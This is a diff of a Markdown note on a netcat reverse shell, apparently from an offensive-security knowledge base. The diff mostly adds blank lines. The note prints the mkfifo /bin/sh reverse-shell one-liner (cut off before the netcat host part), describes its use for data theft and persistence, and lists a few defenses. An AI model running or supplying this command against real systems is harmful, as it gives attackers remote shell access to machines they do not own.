@@ -28,11 +28,15 @@ Technical Explanation: Netcat is used to listen on a specified port on the attac
 
 Business Value: A reverse shell can be used to gain remote access to a target machine, which can be useful for a variety of purposes such as data theft, privilege escalation, or persistence.
 
+ 
+
 ## Requirements
 
 1. OpenBsd installed on the attacking machine
 
 1. Netcat installed on the attacking machine
+
+ 
 
 ## Defense
 
@@ -42,15 +46,25 @@ Business Value: A reverse shell can be used to gain remote access to a target ma
 
 1. Regularly monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Gain remote access to a target machine
+
+ 
 
 # Instructions
 
 1. This command creates a reverse shell connection to a remote server. It first removes any existing /tmp/f file, then creates a named pipe using mkfifo command. It then pipes the contents of the named pipe to /bin/sh -i, which starts an interactive shell. The output of the shell is then redirected to the named pipe, which is connected to a remote server using netcat.
 
+ 
+
+
+
 **Code**: [[rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2]]
+
+
 
 > The command takes two arguments: the IP address of the remote server and the port number to connect to. The IP address and port number should be replaced with the appropriate values for the remote server. Once the command is executed, it will establish a reverse shell connection to the specified server, allowing the attacker to execute commands on the remote system.
 
@@ -59,3 +73,5 @@ Business Value: A reverse shell can be used to gain remote access to a target ma
 - [[Netcat OpenBsd]]
 - [[Reverse Shell]]
 - [[Reverse Shell Cheat Sheet]]
+
+
